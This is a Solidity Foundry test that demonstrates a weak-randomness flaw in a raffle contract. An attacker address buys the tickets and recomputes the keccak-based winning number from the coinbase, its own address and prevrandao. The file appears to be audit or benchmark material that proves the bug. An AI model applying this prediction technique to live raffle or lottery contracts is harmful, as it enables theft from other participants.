
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {Ethraffle_v4b} from "../src/Ethraffle_v4b.sol";

contract TestWeakRandomnessEthraffle_v4b is Test {
    Ethraffle_v4b raffle;

    address attacker = address(0xA11CE);
    address coinbase1 = address(0x100);
    address coinbase2 = address(0x200);

    function setUp() public {
        vm.deal(attacker, 100 ether);
        vm.deal(coinbase1, 0);
        vm.deal(coinbase2, 0);
        vm.prank(attacker);
        raffle = new Ethraffle_v4b();
    }

    function test_highlightPredictableRandomValue(
        uint64 difficultySeed,
        uint8 coinbaseSelector
    ) public {
        vm.assume(difficultySeed > 0);
        vm.assume(coinbaseSelector < 2);

        address chosenCoinbase = coinbaseSelector == 0 ? coinbase1 : coinbase2;

        vm.roll(100);
        vm.warp(1000);
        vm.coinbase(chosenCoinbase);
        vm.prevrandao(bytes32(uint256(difficultySeed)));

        uint256 pricePerTicket = raffle.pricePerTicket();
        uint256 totalTickets = raffle.totalTickets();
        uint256 totalCost = pricePerTicket * totalTickets;

        vm.deal(attacker, totalCost + 1 ether);

        vm.prank(attacker);
        raffle.buyTickets{value: totalCost}();

        address[50] memory contestantsAddrs;
        for (uint256 i = 0; i < totalTickets; i++) {
            (bool ok, bytes memory data) = address(raffle).staticcall(
                abi.encodeWithSignature("contestants(uint256)", i)
            );
            require(ok, "staticcall failed");
            (address addr, uint256 raffleId) = abi.decode(data, (address, uint256));
            require(raffleId == 1, "wrong raffleId");
            contestantsAddrs[i] = addr;
        }

        address seed1 = contestantsAddrs[uint256(uint160(address(chosenCoinbase))) % totalTickets];
        address seed2 = contestantsAddrs[uint256(uint160(address(attacker))) % totalTickets];
        uint256 seed3 = uint256(difficultySeed);
        bytes32 randHash = keccak256(abi.encodePacked(seed1, seed2, seed3));
        uint256 expectedWinningNumber = uint256(randHash) % totalTickets;

        vm.prank(attacker);
        vm.expectEmit(true, true, true, true);
        emit Ethraffle_v4b.RaffleResult(
            1,
            expectedWinningNumber,
            contestantsAddrs[expectedWinningNumber],
            seed1,
            seed2,
            seed3,
            randHash
        );

        vm.prank(attacker);
        raffle.buyTickets{value: pricePerTicket}();
    }
}
